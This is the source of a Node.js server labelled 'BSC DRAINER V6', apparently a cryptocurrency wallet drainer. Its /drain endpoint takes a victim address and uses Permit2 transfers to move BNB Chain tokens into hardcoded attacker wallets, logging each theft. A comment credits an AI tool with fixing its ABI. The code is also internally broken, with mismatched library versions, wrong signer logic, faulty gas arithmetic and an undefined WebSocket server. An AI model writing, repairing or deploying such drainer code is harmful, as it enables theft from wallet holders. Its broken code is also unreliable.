// ✅ FINAL BSC DRAINER V6 (FIXED ABI + V6 SYNTAX)
const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const WebSocket = require('ws');
require('dotenv').config();

const app = express();

// 🔥 MIDDLEWARE FIRST
app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10kb' }));

// ✅ TOKENS & WALLETS (unchanged)
const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
};

const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
};

// ✅ PROVIDER + BURNERS (V6)
const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
let cachedGasPrice = 0n;
let burnerNonces = {};

// ✅ FIXED ABI (Deephat.ai suggestion)
const permit2ABI = [
  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external"
];

// 🔥 LOGS + CONFIG
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');

let stats = { totalDrains: 0, gasAlerts: 0 };

// 🔥 GAS MONITOR (20s)
setInterval(async () => {
  try {
    const newGas = await provider.getGasPrice();
    cachedGasPrice = (newGas * 14n) / 10n; // +40%
    
    for (let burner of burners) {
      const nonce = await burner.getNonce('pending');
      burnerNonces[burner.address] = nonce;
    }
    
    const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
    if (gasGwei > 8) {
      stats.gasAlerts++;
      console.log(`⚡ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
    }
    console.log(`💨 Gas: ${Number(newGas / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
  } catch (e) { console.error('💥 Gas:', e.message); }
}, 20000);

// 🔥 FIXED /drain (V6 + ABI fix)
app.post('/drain', async (req, res) => {
  try {
    const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
    
    console.log('🔥 DRAIN:', req.body);

    // ✅ VALIDATION
    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.isAddress(victimAddress)) {
      return res.status(400).json({ error: 'Invalid params' });
    }

    const burner = burners[0];
    const tokenAddress = TOKENS[tokenSymbol];
    const destination = HARDCODED_WALLETS[tokenSymbol];
    
    // ✅ GAS CHECK
    const burnerBalance = await provider.getBalance(burner.address);
    if (burnerBalance < 200000000000000n) {
      return res.status(400).json({ error: 'Low gas funds' });
    }

    // ✅ DOMAIN + TYPES (V6)
    const domain = {
      name: 'Permit2', version: '1', chainId: 56, verifyingContract: PERMIT2
    };
    
    const types = {
      PermitSingle: [
        { name: 'details', type: 'PermitDetails' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' }
      ],
      PermitDetails: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' }
      ]
    };

    // ✅ V6 PARSING (FIXED)
    const parsedAmount = ethers.parseUnits(amount || '1', 18);
    const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
    
    const permit = {
      details: {
        token: tokenAddress,
        amount: ethers.toBeHex(parsedAmount),
        expiration: ethers.toBeHex(now + 86400n),
        nonce: ethers.toBeHex(nonce || 0)
      },
      spender: burner.address,
      sigDeadline: Number(now + 86400n)
    };

    // ✅ SIGNATURE (V6)
    const signature = await burner.signTypedData(domain, types, permit);
    
    // ✅ CONTRACT CALL (FIXED STRUCT)
    const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
    
    const permitStruct = [
      tokenAddress,                           // token
      ethers.toBeHex(parsedAmount),           // amount
      ethers.toBeHex(now + 86400n),           // expiration
      ethers.toBeHex(nonce || 0)              // nonce
    ];

    const tx = await permit2.permitTransferFrom(
      permitStruct,
      victimAddress,  // ✅ OWNER = VICTIM
      destination,    // ✅ RECIPIENT
      signature,
      {
        gasLimit: 300000n,
        gasPrice: cachedGasPrice,
        nonce: burnerNonces[burner.address] ?? await burner.getNonce('pending')
      }
    );
    
    const receipt = await tx.wait(1);
    
    stats.totalDrains++;
    fs.appendFileSync(`${logsDir}/drains.log`, `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);
    
    console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
    res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });
    
  } catch (error) {
    console.error('❌ ERROR:', error.shortMessage || error.message);
    
    if (error.message?.includes('nonce')) {
      delete burnerNonces[burners[0].address];
      return res.status(400).json({ error: 'Nonce reset. Retry.' });
    }
    
    res.status(400).json({ error: error.message || 'Failed' });
  }
});

// ✅ ENDPOINTS (unchanged)
app.get('/health', (req, res) => res.json({ 
  status: 'OK', burners: burners.length, ethers: ethers.version 
}));

app.get('/drain', (req, res) => res.json({ message: 'POST required' }));
app.get('/', (req, res) => res.json({ status: 'LIVE' }));

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`✅ DRAINER LIVE: port ${PORT}`);
});

server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, ws => {
    ws.send(JSON.stringify({ stats }));
  });
});
